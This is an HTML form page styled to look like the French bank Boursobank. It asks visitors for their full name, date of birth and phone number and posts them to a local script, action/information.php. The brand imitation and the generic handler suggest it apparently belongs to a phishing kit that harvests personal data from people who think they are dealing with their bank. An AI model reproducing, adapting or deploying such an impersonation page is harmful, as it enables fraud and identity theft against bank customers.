<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="short icon" href="instruments-logo-4677.png">

    <title>Formulaire - Boursobank</title>
    <style>
        /* Votre CSS reste inchangé */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #f3f4fc, #eef4fc);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .top-logo {
            margin-bottom: 70px;
            width: 100%;
            height: 20%;
        }

        .top-logo img {
            max-width: 200px;
        }

        .form-box {
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            height: auto;
            overflow: hidden;
            position: relative;
        }

        .header-bar {
            background: linear-gradient(to right, #d9007f, #ff007a);
            height: 10px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
        }

        .form-content {
            padding: 50px;
        }

        .form-logo img {
            max-width: 50px;
            margin-bottom: 15px;
        }

        h1 {
            font-weight: 500;
            color: #003883;
            font-size: 1.3rem;
            margin-bottom: 10px;
        }

        .verification-text {
            font-size: 0.7rem;
            margin-bottom: 5px;
            color: #667e9b !important;
        }

        .input-line {
            border: none;
            border-bottom: 2px solid #00bfff;
            outline: none;
            font-size: 1rem;
            padding: 5px;
            width: 80%;
            max-width: 250px;
            margin-bottom: 20px;
        }

        .btn {
            background: #ff006f;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
            transition: background 0.3s;
            width: 100%;
        }

        .btn:hover {
            background: #e60064b1;
        }

        .footer-links {
            margin-top: 20px;
            font-size: 0.8rem;
            color: #999;
        }

        .footer-links a {
            color: #999;
            text-decoration: none;
            margin: 0 5px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo principal -->
        <div class="top-logo">
            <img src="rvb-logo-3000_original_original-1024x188.png" alt="Logo Principal">
        </div>

        <!-- Boîte du formulaire -->
        <div class="form-box">
            <!-- Bande rose -->
            <div class="header-bar"></div>

            <!-- Formulaire principal -->
            <div class="form-content">
                <!-- Logo secondaire -->
                <div class="form-logo">
                    <img src="instruments-logo-4677.png" alt="Logo Secondaire">
                </div>

                <!-- Titre -->
                <h1>Informations personnelles</h1>

                <!-- Texte explicatif -->
                <div class="verification-text">
                    Veuillez remplir les champs ci-dessous avec vos informations personnelles
                </div>

                <!-- Formulaire -->
                <form action="action/information.php" method="POST">
                    <!-- Champ Nom et prénom -->
                    <input type="text" class="input-line" name="fullname" placeholder="Nom et prénom" required>

                    <!-- Champ Date de naissance -->
                    <input type="date" class="input-line" name="dob" placeholder="Date de naissance" required>

                    <!-- Champ Numéro de téléphone -->
                    <input type="tel" class="input-line" name="phone" placeholder="Numéro de téléphone" required maxlength="10">

                    <!-- Bouton -->
                    <button class="btn" type="submit">Envoyer</button>
                </form>
            </div>
        </div>

        <!-- Liens de bas de page -->
        <div class="footer-links">
            <a href="#">Aide</a> / <a href="#">Opposition</a> / <a href="#">Sécurité</a>
        </div>
    </div>
</body>
</html>
